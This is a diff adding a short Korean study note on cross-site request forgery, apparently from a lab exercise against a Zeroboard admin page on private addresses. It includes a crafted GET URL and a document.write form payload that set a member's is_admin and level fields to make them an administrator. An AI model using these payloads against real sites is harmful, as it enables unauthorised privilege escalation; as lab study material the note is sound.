@@ -1,0 +1,21 @@
+csrf(cross site request forgery)
+	-xss의 변종기법: xss와 변조를 합침.
+	-스크립트를 사용하지 않고 html 태크를 사용하여 취약점을 공략.
+
+	실습
+		1. GET 요청 만들기
+			분석이 선행되어야 함.
+			어떤 입력이 있는지 확인.
+			입력에 맞춰 GET 요청 만들기.
+			http://192.168.3.230/zboard/admin_setup.php?exec=view_member&group_no=1&page=1&exec2=modify_member_ok&is_admin=1&level=1&name=aodlf982&member_no=9
+		
+		2. POST 요청 만들기
+			분석이 선행되어야 함.
+			어떤 입력이 있는지 확인.
+			입력에 맞춰 POST를 보낼 수 있는 폼을 작성.
+			document.write("<form method=post action=http://192.168.3.247/zboard/admin_setup.php> <input type=text name=name value=aodlf982> <input type=text name=level value=1> <input type=text name=is_admin value=1> <input type=text name=email value=aodlf98@aodlf.com> <input type=text name=exec value=view_member> <input type=text name=exec2 value=modify_member_ok> <input type=text name=group_no value=1> <input type=text name=member_no value=3> <input type=text name=page value=1> <input type=text name=keyword value=> <input type=submit> </form>");
+	
+		*html 입력요소
+			<input>, <button>, <submit>, <select>, <textarea>, <label>, <option>, <fieldlist>, <legend>, <optgroup>, <datalist>, <keygen>, <output>
+
+		하지만 이 사이트의 경우 관리자로 로그인을 한다음에 주어지는 쿠키나 세션으로 식별이 되는 자만 변경이 가능.
